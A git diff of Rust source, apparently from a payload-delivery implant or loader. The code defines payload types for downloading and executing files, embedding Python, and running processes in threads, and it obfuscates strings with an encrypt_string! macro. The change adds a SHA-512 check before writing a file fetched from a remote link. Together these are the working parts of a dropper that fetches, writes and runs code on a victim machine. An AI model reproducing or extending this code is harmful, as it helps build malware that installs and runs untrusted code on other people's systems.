@@ -55,7 +55,7 @@ impl Payload {
             //Payload::DownloadAndExec(payload) => payload.download_and_exec(),
             Payload::ExecPython(payload) => payload.deploy_embedder(),
             Payload::Banner() => banner(),
-            Payload::WriteFile(payload) => payload.download_file(),
+            Payload::WriteFile(payload) => payload.write_file(),
             Payload::Exec(payload) => payload.exec_file(),
         };
         //    Ok(PayloadExec::NoThread())
@@ -287,8 +287,8 @@ pub struct WriteFile {
     pub link: Link,
     pub path: String,
     pub hash: String, // optionnal hash to verify if an existing file should be replaced or not.
-    //pub out_overwrite: bool,
-    //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
+                      //pub out_overwrite: bool,
+                      //random name... mais il faut trouver un moyen pour passer la value aux payloads suivantes.
 }
 use std::fs::File;
 //use std::io::Write;
@@ -296,19 +296,49 @@ use std::fs::create_dir_all;
 //use std::path::Path;
 use shellexpand;
 
-impl WriteFile {
-    pub fn download_file(&self) -> Result<PayloadExec, anyhow::Error> {
-        //TODO verify if file already exist and calculate hash before replacing it.
-        
-        let body: Vec<u8> = self.link.fetch_data()?;
-        //let data_write_path = self.write_file(body)?;
-        //TODO calculate the PATH, create
-        let path: PathBuf = calculate_path(&self.path)?;
-        let _ = create_diretory(&path)?;
+use chksum_sha2_512 as sha2_512;
 
-        let mut f = File::create(&path)?;
-        info!("[+] Write file: {:?}", path);
-        f.write_all(&body)?;
+//use std::io;
+use std::io::prelude::*;
+//use std::fs::File;
+
+pub fn same_hash_sha512(hash: &String, path: &PathBuf) -> bool {
+    if *hash == "".to_string() {
+        return false;
+    }
+
+    let mut f = match File::open(path) {
+        Ok(f) => f,
+        Err(_) => return false,
+    };
+    let mut buffer: Vec<u8> = Vec::new();
+
+    // read the whole file
+    match f.read_to_end(&mut buffer) {
+        Ok(_) => (),
+        Err(_) => return false,
+    };
+    let digest = sha2_512::chksum(buffer).unwrap();
+
+    digest.to_hex_lowercase() == *hash
+}
+
+impl WriteFile {
+    pub fn write_file(&self) -> Result<PayloadExec, anyhow::Error> {
+        //TODO verify if file already exist and calculate hash before replacing it.
+        let path: PathBuf = calculate_path(&self.path)?;
+
+        if same_hash_sha512(&self.hash, &path) == false {
+            let _ = create_diretory(&path)?;
+
+            let body: Vec<u8> = self.link.fetch_data()?;
+
+            info!("[+] Write file: {:?}", path);
+            let mut f = File::create(&path)?;
+            f.write_all(&body)?;
+        } else {
+            info!("[+] No Write, same hash: {:?}", path);
+        }
         Ok(PayloadExec::NoThread())
     }
 }
@@ -357,7 +387,8 @@ impl Exec {
         }
         if self.thread {
             let tj: thread::JoinHandle<()> = thread::spawn(move || {
-                let mut c=comm.spawn()
+                let mut c = comm
+                    .spawn()
                     .expect(&encrypt_string!("failed to execute process"));
                 let _ = c.wait();
             });
